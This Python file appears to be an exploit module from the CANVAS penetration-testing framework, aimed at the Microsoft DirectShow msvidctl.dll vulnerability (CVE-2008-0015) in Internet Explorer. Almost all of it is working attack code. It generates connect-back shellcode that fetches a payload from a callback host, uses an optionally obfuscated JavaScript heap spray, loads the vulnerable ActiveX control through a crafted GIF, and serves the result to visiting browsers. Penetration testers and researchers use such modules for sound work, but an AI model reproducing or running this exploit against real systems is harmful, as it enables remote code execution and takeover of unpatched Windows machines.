#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from shellcode import shellcodeGenerator
import canvasengine
from tcpexploit import tcpexploit
from httpclientside import httpclientside

NAME='Microsoft DirectShow (msvidctl.dll) Vulnerability'
DESCRIPTION='Microsoft DirectShow (msvidctl.dll) Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Datepublic']='07/06/2009'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['References']='http://isc.sans.org/diary.html?storyid=6733'
DOCUMENTATION['CVE Name']='CVE-2008-0015'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0015'
DOCUMENTATION['Notes']='Tested against a Windows XP SP2 & SP3 English, German & Simplified Chinese with IE 6. IE 7 asks for confirmation before executing the object code.'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Client Side'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP','2003']
PROPERTY['MSADV']='MS09-032'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
http://www.microsoft.com/technet/security/advisory/972890.mspx
http://www.microsoft.com/technet/security/bulletin/ms09-032.mspx

Exploit is based on the one found in the wild.

To test from command line:
   bash-3.00$ ./commandlineInterface.py -v 1 -p 5555
   bash-3.00$ ./exploits/httpserver/httpserver.py -O singleexploit:msvidctl -l 10.10.10.208 -p 8080 -d 5555
"""

CHANGELOG="""
"""

VERSION='1.0'

targets={
    0: ['Autoversioning',0],
    1: ['Windows XP, 2003',0x0c0c0c0c],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.searchMethod=self.FindBrowser_FindAnyTag_CmpExtraInfo
        self.UserAgent=[('Mozilla/','MSIE','')]
        self.version=1
        self.badstring='\0\xff'
        self.name=NAME
        self.filename='index.html'
        self.listenerArgsDict['fromcreatethread']=0
        self.obfuscate=False        
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print 'Version %d: %s'%(v,self.versions[v][0])

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        httpWrapper=''
        try:
            if self.HTTPMOSDEF==True:
                self.log('[!] Using HTTP MOSDEF tunneling payload')
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x400})
                sc.addAttr('revert_to_self_before_importing_ws2_32',None)
                if self.useSSLMOSDEF == True:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,self.callback.ip,self.callback.port)})
                httpWrapper=sc.get()
                self.log('[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper)))
        except Exception,msg:
            #print 'Exception in HTTP MOSDEF Payload generation: %s' % msg
            httpWrapper=''
        self.shellcode=self.createInjectToSelf(self.callback.ip,self.callback.port,injectme=httpWrapper)
        return self.shellcode

    def run(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        filedata=self.makefile()
        self.log('Opening %s for output'%self.filename)
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%self.filename)
        return 1

    def javascript_encode(self):        
        js="""
var appllaa='0';
var nndx='%'+'u9'+'0'+'9'+'0'+'%u'+'9'+'0'+'9'+appllaa;
var dashell=unescape(nndx+"SHELLCODE");
var headersize=20;
var omybro=unescape(nndx);
var slackspace=headersize+dashell.length;
while(omybro.length<slackspace)
    omybro+=omybro;
bZmybr=omybro.substring(0,slackspace);
shuishiMVP=omybro.substring(0,omybro.length-slackspace);
while(shuishiMVP.length+slackspace<0x30000)
    shuishiMVP=shuishiMVP+shuishiMVP+bZmybr;
memory=new Array();
for(x=0;x<400;x++)
    memory[x]=shuishiMVP+dashell;
var myObject=document.createElement('object');
DivID.appendChild(myObject);
myObject.width='1';
myObject.height='1';
myObject.data='./logo.gif';
myObject.classid='clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
"""  
        js=js.replace('SHELLCODE',urluencode(self.shellcode))        
        self.obfuscate=self.argsDict.get('obfuscate',self.obfuscate)
        if self.obfuscate:
            self.log('Obfuscating javascript code.')
            js=self.obfuscate_javascript(js)
        return js

    def makefile(self):        
        filedata="""<html>
<body>
<span id='DivID' />
<script language='javascript'>JAVASCRIPT</script>
</body>
</html>
"""
        javascript=self.javascript_encode()
        filedata=filedata.replace('JAVASCRIPT',javascript)
        return filedata
        
    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.filename):
            self.shellcode=self.createShellcode()
            sploitstring=self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count('logo.gif'):
            h.addHeader('Content-Type','content/gif')
            b.setBody('\x00\x03\x00\x00\x11\x20\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00'+
                      '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+
                      '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'+
                      '\x00\x00\x00\x00\x00\x00'+struct.pack('<LL',0xffffffff,0x0c0c0c0c)+'\x00')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
